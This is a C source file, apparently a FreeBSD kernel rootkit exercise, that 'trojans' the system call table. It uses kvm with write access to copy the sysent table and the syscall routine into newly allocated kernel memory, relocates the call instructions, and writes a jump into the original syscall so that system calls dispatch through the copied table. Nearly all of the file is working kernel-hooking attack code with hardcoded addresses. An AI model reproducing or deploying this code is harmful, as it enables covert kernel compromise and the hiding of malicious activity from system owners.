//
// This code attempts to trojan the sysent table. That is the ultimate
// goal. But right now, only parts of it is implemented. The technique
// is the same as in inline hooking of a system call (mkdir_patch.c) 
// done earlier. The code in the syscall function in trap.c is hooked
// The code bytes are copied to another address in the kernel memory
// and all calls are patched prior to that based on the new address.
// All calls and jumps have relative addresses and not absolute ones.
// Hence patching is needed.

// Now to trojan the sysent table, the syscall code has to be patched
// to point to the new trojan table. Then we are in business.

#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <stdlib.h>
// 
// The three defines below are for sysent struct size
// table size and the size of the syscall code.
// The syscall code size is obtained by examining the objdump
// output of syscall:
// first do
// nm /boot/kernel/kernel | grep syscall to get the address
// Then do 
// objdump -dRS --startaddress=<syscall address> --stopaddress=<some fairly large value> /boot/kernel/kernel
// Then measure the offset from the start of the dump till the ret command and
// epilogue. That is 5d0.

#define SYSENT_SIZE 28
#define SYSENT_TABLE_SIZE SYSENT_SIZE * 513
#define SYSCALL_SIZE 0x5d0

#define SYSCALL_OFFSET 0xc8

// We need this jump to move from original syscall to copied
// syscall and then to jump back to the original after the
// patched sysent address part.

unsigned char jump[] = "\xb8\x00\x00\x00\x00\xff\xe0";

unsigned char move[] = "\xc7\x40\x04\x00\x00\x00\x00";


// The array below can be automagically generated. But right now it is
// hardcoded by analyzing the objdump of syscall. It gives the offset
// of the instructions after the e8 instruction.  There are 23 such
// calls in the syscall code.

// Automagic generation logic: find the location of e8 instruction
// in syscall code, and then step 4 bytes and subtract the base
// address from the resulting address 

unsigned long offsetarraynew[] = { 
0x43,
0x9f,
0xbb,
0x145,
0x175,
0x1ee,
0x208,
0x24b,
0x2a7,
0x2b7,
0x2fa,
0x313,
0x340,
0x3f9,
0x426,
0x436,
0x461,
0x4b9,
0x4d0,
0x513,
0x573,
0x587,
0x5ca };


	unsigned long offsetarrayold[] = { 
0x43,
0x9f,
0xbb,
0x13e,
0x16e,
0x1e7,
0x201,
0x244,
0x2a0,
0x2b0,
0x2f3,
0x30c,
0x339,
0x3f2,
0x41f,
0x42f,
0x45a,
0x4b2,
0x4c9,
0x50c,
0x56c,
0x580,
0x5c3 };


// The array below can also be automagically generated. kvm_nlist can do 
// this for us. The addresses below are all not unique because the same
// routine can be called from several different locations in the
// syscall code. 

unsigned long calladdress[] = { 0xc08771c0, 0xc0baecb8, 0xc0baecb8, 0xc0bae9cc,
		0xc0861c40, 0xc086dda0, 0xc08be5f0, 0xc086dc30,
		0xc086dda0, 0xc087e7a0, 0xc086dc30, 0xc0a752d0,
		0xc0a74fd0, 0xc0bae500, 0xc0883980, 0xc08b62f0,
		0xc0861c00, 0xc086dda0, 0xc08be5f0, 0xc086dc30,
		0xc086dda0, 0xc087e7a0, 0xc086dc30 };

unsigned long patchvalue[23]; 
unsigned long patchaddress[23]; 

int main(int argc, char ** argv) {
	

	int i, j, syscall_num;

	struct module_stat stat;
	char errbuf[_POSIX2_LINE_MAX];

	kvm_t *kd;

	struct nlist nl[] = { {NULL}, {NULL}, {NULL}};

	unsigned char sysent_table[SYSENT_TABLE_SIZE];
	
	unsigned char syscall_code[SYSCALL_SIZE];

	unsigned long addr = 0, addr1 = 0, size;


	kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);

	if (kd == NULL) {
		fprintf(stderr, "ERROR: %s\n", errbuf);
		exit(-1);
	}

	nl[0].n_name = "sysent";
	nl[1].n_name = "syscall";

	if (kvm_nlist(kd, nl) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (!nl[0].n_value) {
		fprintf(stderr, "ERROR: Symbol %s not found \n");
		exit(-1);
	}

	if (!nl[1].n_value) {
		fprintf(stderr, "ERROR: Symbol %s not found \n");
		exit(-1);
	}

	if (kvm_read(kd, nl[0].n_value, sysent_table, SYSENT_TABLE_SIZE) < 0 ) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (kvm_read(kd, nl[1].n_value, syscall_code, SYSCALL_SIZE) < 0 ) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

// At this point the contents of sysent are copied to sysent_table
// and the syscall code is copied to the syscall_code. The nl[0].n_value 
// is the base address of sysent and the nl[1].n_value is the 
//base address of syscall.

			
	stat.version = sizeof(stat) ;
	modstat(modfind("kmalloc"), &stat);

	syscall_num = stat.data.intval;

	syscall(syscall_num, SYSENT_TABLE_SIZE, &addr);

	size = SYSCALL_SIZE +  sizeof(move);

	syscall(syscall_num, size, &addr1);

// Now two chunks of memory are allocated at addr and addr1. Their sizes
// are that of sysent and syscall

// The loop below will run through the offset and call address arrays
// and compute the patch values. The patch value is the number of bytes
// to jump from the call site to the function being called. So it is
// the address of the function minus the address of the instruction
// following the call. The address of the instruction following the call
// instruction is obtained by adding the offset to the base address.
	for (i = 0; i < 23; i++) {
		patchvalue[i] = calladdress[i] - (addr1 + offsetarraynew[i]);

		//printf("%x\n", patchvalue[i]);
	}	

// The loop below will now patch the addresses. The logic is to find
// the location of the e8 instruction and then place the patch
// into the next four bytes as an unsigned long * value.


	for ( i = 0, j = 0; i < SYSCALL_SIZE && j < 23; i++) {

		if (syscall_code[i] == 0xe8) {
			*(unsigned long *)&syscall_code[i+1] = patchvalue[j];
			j++;
		}
	}


	for (i = 0; i < 23; i++) {
		
		j = offsetarrayold[i] - 4;
		*(unsigned long *)&syscall_code[j] = patchvalue[i];
	}


		


	if (kvm_write(kd, addr, sysent_table, SYSENT_TABLE_SIZE) < 0 ) { 
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

/*	
	if (kvm_write(kd, addr1, syscall_code, SYSCALL_SIZE) < 0 ) { 
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}
*/

	if (kvm_write(kd, addr1, syscall_code, SYSCALL_OFFSET) < 0 ) { 
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	*(unsigned long *)&move[3] = addr;

	if (kvm_write(kd, addr1 + SYSCALL_OFFSET , move, sizeof(move) - 1) < 0 ) { 
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (kvm_write(kd, addr1 + SYSCALL_OFFSET + sizeof(move) - 1, syscall_code+SYSCALL_OFFSET , SYSCALL_SIZE - SYSCALL_OFFSET) < 0 ) { 
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}
// By this point the sysent and patched syscall are copied to the new
// locations.


// Now a jump has to be coded into the original syscall code so that
// control can transfer to the new memory location.

	*(unsigned long *)&jump[1] = addr1;




	if (kvm_write(kd, nl[1].n_value , jump, sizeof(jump)) < 0 ) { 
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}



// At this point, when a trap happens, control goes to original
// syscall from where it jumps to our newly allocated address.
// The system functions exactly as before because we have not
// changed the syscall code in any way, except for the patched
// addresses.


	if (kvm_close(kd) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	printf("Address of sysent current 0x%x and new 0x%x\n", nl[0].n_value, addr);
	printf("Address of syscall current 0x%x and new 0x%x\n", nl[1].n_value, addr1);

	exit(0);
}


	


